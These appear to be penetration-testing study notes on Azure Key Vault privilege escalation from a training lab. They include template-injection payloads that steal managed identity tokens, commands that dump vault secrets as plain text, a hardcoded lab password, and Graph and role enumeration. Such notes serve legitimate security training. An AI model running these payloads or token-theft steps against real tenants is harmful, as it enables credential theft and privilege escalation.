# Key Vault

### Key Vault

* Azure service for storing secrets like passwords, connection strings, certificates, private keys etc.
* With right permissions and access, Azure resources that support managed identities (VMs, App Service, Functions, Container etc.) can securely retrieve secrets from the key vault.
* Object types available with a key vault:
  * Cryptographic Keys - RSA, EC etc.
  * Secrets - Passwords, connection strings
  * Certificates - Life cycle management
  * Storage account keys - Key vault can manage and rotate access keys for storage accounts
* Objects in a key vault are identified using Object Identifier URL.
*   The base URL is of the format :

    https://{vaultname}.vault.azure.net/{object-type}/{object-name}/{object-version}

    * vault-name is the globally unique name of the key vault
    * object-type can be "keys", "secrets" or "certificates"
    * object-name is unique name of the object within the key vault
    * object version is system generated and optionally used to address a unique version of an object.
* Access to a vault is controlled though two planes:
  * Management plane - To manage the key vault and access policies. Only Azure role based access control (RBAC) is supported.
  * Data plane - To manage the data (keys, secrets and certificates) in the key vault. This supports key vault access policies or Azure RBAC.
* Please note that a role (like Owner) that has permissions in the management plane to manage access policies can get access to the secrets by modifying the access policies.

#### **Privilege Escalation - Key Vault**

* If we can compromise an azure resource whose managed identity can read secrets from a key vault (due to an access policy or assigned one of the capable roles or a custom role), it may be possible to gain access to more resources.
* Note that each secret has its own IAM inherited from the KeyVault.
* Overly permissive access policies may result in access to data stored in a vault.

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/3d7e6138-63c1-42d7-94c9-f77ae6717fdb/9ba123b3-4e60-489a-b98c-cbcce5c7a4e1/image.png)

```powershell
{{config.__class__.__init__.__globals__['os'].popen('curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER').read()}}
{{config.__class__.__init__.__globals__['os'].popen('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER').read()}}

Connect-AzAccount -AccessToken $token -AccountId 2e91a4fe-a0f2-46ee-8214-fa2ff6aa9abc -KeyVaultAccessToken $keyvaulttoken

Get-AzKeyVault
Get-AzKeyVaultSecret -VaultName ResearchKeyVault
Get-AzKeyVaultSecret -VaultName ResearchKeyVault -Name Reader –AsPlainText
```

```powershell
$password = ConvertTo-SecureString 'Hav3Y0uLooked@KeyVault!!Azur3' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('kathynschaefer@defcorphq.onmicrosoft.com', $password)
Connect-AzAccount -Credential $creds

# Enumerating resources
Get-AzResource

# Enumerating Role assignments
Get-AzRoleAssignment -Scope /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/RESEARCH/providers/Microsoft.Compute/virtualMachines/jumpvm

Get-AzRoleDefinition -Name "Virtual Machine Command Executor"
Get-AzADGroup -DisplayName 'VM Admins'
Get-AzADGroupMember -GroupDisplayName 'VM Admins' | select DisplayName
```

```powershell
(Get-AzAccessToken -ResourceUrl <https://graph.microsoft.com>).Token

$Token =  'eyJ0eX..'
$URI = ' <https://graph.microsoft.com/v1.0/users/VMContributorX@defcorphq.onmicrosoft.com/memberOf>'

$RequestParams = @{
    Method  = 'GET'
    Uri     = $URI
    Headers = @{
        'Authorization' = "Bearer $Token" 
    }
}
(Invoke-RestMethod @RequestParams).value 
```

```powershell
# Gather information about the administrative unit
Connect-AzAccount -Credential $creds
$Token = (Get-AzAccessToken -ResourceTypeName MSGraph).Token
Connect-MgGraph -AccessToken ($Token | ConvertTo-SecureString -AsPlainText -Force)

Get-MgDirectoryAdministrativeUnit -AdministrativeUnitId e1e26d93-163e-42a2-a46e-1b7d52626395
Get-MgDirectoryAdministrativeUnitMember -AdministrativeUnitId e1e26d93-163e-42a2-a46e-1b7d52626395 | fl *
Get-MgDirectoryAdministrativeUnitScopedRoleMember -AdministrativeUnitId e1e26d93-163e-42a2-a46e-1b7d52626395 | fl *

(Get-MgDirectoryAdministrativeUnitScopedRoleMember -AdministrativeUnitId e1e26d93-163e-42a2-a46e-1b7d52626395).RoleMemberInfo
Get-MgDirectoryRole -DirectoryRoleId 5b3935ed-b52d-4080-8b05-3a1832194d3a
Get-MgUser -UserId 8c088359-66fb-4253-ad0d-a91b82fd548a | fl *
```
